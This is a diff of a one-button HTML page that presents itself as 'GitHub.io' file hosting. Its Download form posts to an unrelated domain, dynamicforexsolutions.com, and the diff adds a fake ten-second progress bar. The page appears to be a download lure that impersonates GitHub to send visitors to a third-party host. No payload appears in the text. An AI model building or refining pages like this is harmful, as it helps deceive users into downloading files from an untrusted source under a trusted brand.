@@ -1,6 +1,6 @@
-<!DOCTYPE HTML>
-<html>
-	<head>
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
 		<meta charset="utf-8">
 		<title>GitHub.io - Fast and secure GitHub based file hosting</title>
 		<link rel="icon" type="image/x-icon" href="https://i.postimg.cc/Ls6BmqF3/favicon.png">
@@ -15,6 +15,22 @@ body{
     font-family: 'Exo', sans-serif;
 }
 
+.progress-bar {
+            width: 100%;
+            height: 10px;
+            background-color: #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+            margin-top: 10px;
+            display: none;
+        }
+		
+.progress {
+            height: 100%;
+            width: 0%;
+            background-color: #4caf50;
+            transition: width 10s linear;
+        }
 
 .context {
     width: 100%;
@@ -455,7 +471,7 @@ container {
 	</head>
 	<body>
 <container>
-	<div class="area" >
+	<div class="area">
             <ul class="circles">
                     <li></li>
                     <li></li>
@@ -468,13 +484,32 @@ container {
                     <li></li>
                     <li></li>
             </ul>
-    </div >
-  <form class="sleep__letters" style="display:block; margin: 0 auto;padding-top: 15px; text-align: center" action="https://dynamicforexsolutions.com/link.php" method="POST">
-    <button class="download-button"><div class="sleep" style="font-family:Black Han Sans; sans-serif;">Download</div></button>
-	</form>
-</div>
-        </div>
     </div>
+  <form class="sleep__letters" id="download-button" style="display:block; margin: 0 auto;padding-top: 15px; text-align: center" action="https://dynamicforexsolutions.com/url/" method="POST">
+    <button class="download-button"><div class="sleep" style="font-family:Black Han Sans; sans-serif;">Download</div></button>
+	<div class="progress-bar">
+            <div class="progress"></div>
+        </div>
+	</form>
 </container>
-	</body>
+	
+
+</body>
+<script>
+document.getElementById("download-button").addEventListener("click", function() {
+            const progressBar = document.querySelector(".progress-bar");
+            const progress = document.querySelector(".progress");
+
+            progress.style.width = "0%";
+            progressBar.style.display = "block";
+
+            setTimeout(() => {
+                progress.style.width = "100%";
+            }, 10);
+
+            setTimeout(() => {
+                progressBar.style.display = "none";
+            }, 10000);
+        });
+</script>
 </html>
